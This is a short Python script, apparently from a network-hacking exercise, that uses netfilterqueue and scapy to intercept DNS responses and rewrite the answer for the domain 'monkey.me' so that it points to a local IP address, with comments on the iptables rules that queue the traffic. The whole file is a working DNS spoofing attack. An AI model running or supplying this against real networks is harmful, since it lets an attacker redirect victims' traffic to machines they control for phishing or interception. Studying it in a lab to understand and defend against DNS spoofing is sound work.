import netfilterqueue
import scapy.all as sp


# for local iptables -I OUTPUT -j NFQUEUE --queue-num 0 and iptables -I INPUT -j NFQUEUE --queue-num 0

def process_packet(packet):
    scapy_packet = sp.IP(packet.get_payload())  # converting packet to scapy_packet

    if scapy_packet.haslayer(sp.DNSRR):  # DNS Response
        # print(scapy_packet.show())

        qname = scapy_packet[sp.DNSQR].qname  # target domain
        #print(qname)
        if 'monkey.me' in str(qname):

            print("[+] Spoofing target", qname)
            answer = sp.DNSRR(rrname=qname, rdata="192.168.29.67")  # answer:New DNSRR packet with H_IP
            scapy_packet[sp.DNS].an = answer  # replacing an with modified packet[answer]
            scapy_packet[sp.DNS].ancount = 1  # ancount is the answer packet count

            # we just del the len and chksum to get new len and chksum from scapy
            del scapy_packet[sp.IP].len
            del scapy_packet[sp.IP].chksum
            del scapy_packet[sp.UDP].len
            del scapy_packet[sp.UDP].chksum

            packet.set_payload(bytes(scapy_packet))  # bytes for the python3

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # binding the queue and 0 is the queue number
queue.run()
